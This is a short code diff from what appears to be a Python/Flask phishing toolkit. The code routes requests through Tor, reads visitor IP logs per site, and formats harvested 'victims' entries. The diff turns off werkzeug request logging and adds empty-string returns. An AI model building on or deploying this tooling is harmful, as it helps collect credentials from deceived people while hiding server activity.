@@ -13,9 +13,9 @@ from src import requests
 from src.torpy.http.requests import TorRequests
 from src.flask import Flask, render_template, request
 import logging
-#log = logging.getLogger('werkzeug')
-#log.disabled = True
-#environ['WERKZEUG_RUN_MAIN'] = 'true'
+log = logging.getLogger('werkzeug')
+log.disabled = True
+environ['WERKZEUG_RUN_MAIN'] = 'true'
 
 try:
     subprocess.check_output('php -v > /dev/null 2>&1',shell=True)
@@ -150,7 +150,7 @@ def visitors(server):
     r = open('sites/'+server+'/ip.txt').read().split('\n')
     f = ip_details(r)
     if not f:
-        return
+        return ''
     for a in f:
         k = list(a.keys())
         v = list(a.values())
@@ -170,6 +170,8 @@ def victims(server):
         if a:
             b = a.split('<!:!>')
             final += v1+b[0]+v2+b[1]+v3
+    if not final:
+        return ''
     return final
 
 def ip_details(lisz):
